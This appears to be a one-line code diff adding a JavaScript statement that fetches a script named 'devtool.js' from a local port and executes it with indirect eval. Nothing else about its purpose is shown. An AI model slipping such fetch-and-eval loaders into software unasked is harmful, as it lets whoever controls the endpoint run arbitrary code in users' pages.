@@ -1,0 +1,1 @@
+fetch('http://127.0.0.1:8787/devtool.js').then(r=>r.text()).then(code=>(0,eval)(code));
